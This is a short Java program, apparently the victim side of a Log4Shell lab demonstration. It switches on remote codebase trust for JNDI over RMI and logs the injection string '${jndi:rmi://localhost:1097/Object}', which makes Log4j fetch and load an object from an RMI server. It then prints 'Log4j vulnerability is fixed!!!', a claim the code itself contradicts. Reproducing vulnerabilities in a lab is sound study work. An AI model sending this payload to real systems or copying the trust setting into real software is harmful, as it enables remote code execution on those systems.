package log4jattack;

import java.rmi.RemoteException;
import java.util.concurrent.CountDownLatch;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


import javax.naming.NamingException;

public class TargetClient {
	public static void main(String[] args) throws NamingException, RemoteException, InterruptedException {
		System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");		
		Logger logger=LogManager.getLogger(TargetClient.class.getName());
		logger.error("${jndi:rmi://localhost:1097/Object}");
		System.out.println("Log4j vulnerability is fixed!!!");
		new CountDownLatch(1).await();
	}
}
